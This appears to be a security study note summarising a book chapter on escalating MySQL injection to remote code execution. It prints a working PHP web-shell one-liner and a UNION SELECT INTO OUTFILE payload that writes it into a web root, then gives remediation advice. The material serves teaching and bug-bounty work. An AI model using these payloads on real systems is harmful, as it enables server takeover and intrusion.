# SQL Injection to Web Shell via OUTFILE

- **What it is:** A high-impact SQL injection can become server-side code execution if the database can write attacker-controlled script content into the web root.
- **Where to look:** Confirmed MySQL injection plus unnecessary database filesystem-write privileges.
- The book's PHP web-shell primitive is:

```php
<? system($_REQUEST['cmd']); ?>
```

- It demonstrates placing the script into a web-accessible file with `INTO OUTFILE`.

```sql
UNION SELECT "<? system($_REQUEST['cmd']); ?>"
INTO OUTFILE "/var/www/html/shell.php"
```

- Verify impact only within explicit authorization; this crosses from SQL injection into RCE.
- **False positives / edge cases:** File permissions, database secure-file settings, web-root location, and script execution policy often block this chain.
- **Remediation:** Parameterize SQL and remove database write access to executable web directories.

## Source: Bug Bounty Bootcamp, Ch. 11
